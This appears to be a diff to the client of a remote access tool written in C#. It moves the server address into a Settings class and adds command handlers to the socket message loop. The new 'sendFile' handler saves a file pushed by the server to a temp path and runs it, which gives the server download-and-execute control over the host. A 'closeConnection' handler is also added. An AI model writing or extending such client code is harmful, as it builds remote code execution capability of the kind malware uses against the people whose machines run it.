@@ -19,6 +19,13 @@ using System.Windows.Forms;
 
 namespace Client
 {
+    class Settings
+    {
+        public static string IP = "127.0.0.1";
+        public static int Port = 8080;
+        public static string Version = "0.2";
+    }
+
     class Program
     {
         public static Socket client { get; set; }
@@ -46,7 +53,7 @@ namespace Client
                 client.SendBufferSize = 50 * 1024;
                 client.ReceiveTimeout = -1;
                 client.SendTimeout = -1;
-                client.Connect("127.0.0.1", 8080);
+                client.Connect(Settings.IP, Settings.Port);
                 Debug.WriteLine("Connected!");
                 Buffer = new byte[1];
                 Buffersize = 0;
@@ -163,7 +170,7 @@ namespace Client
             unpack_msgpack.DecodeFromBytes((byte[])Data);
             switch (unpack_msgpack.ForcePathObject("Packet").AsString)
             {
-                case "MessageBox":
+                case "sendMessage":
                     {
                         MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                     }
@@ -172,6 +179,25 @@ namespace Client
                 case "Ping":
                     {
                         Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                    }
+                    break;
+
+                case "sendFile":
+                    {
+                        string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
+                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
+                        Process.Start(FullPath);
+                    }
+                    break;
+
+                case "closeConnection":
+                    {
+                        try
+                        {
+                            client.Shutdown(SocketShutdown.Both);
+                        }
+                        catch { }
+                        Environment.Exit(0);
                     }
                     break;
             }
